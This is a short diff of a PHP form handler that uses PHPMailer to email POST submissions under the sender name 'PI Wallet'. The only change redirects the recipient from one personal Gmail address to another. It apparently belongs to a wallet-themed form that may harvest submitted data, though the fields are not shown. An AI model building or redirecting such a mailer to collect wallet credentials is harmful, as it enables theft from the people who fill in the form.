@@ -37,7 +37,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
                     // Recipient settings
                     $mail->setFrom('nellyfancii@gmail.com', 'PI Wallet'); // Sender's email and name
-                    $mail->addAddress('nellyfancii@gmail.com'); // Recipient's email
+                    $mail->addAddress('kutijude1@gmail.com'); // Recipient's email
 
                     // Email content
                     $mail->isHTML(true);
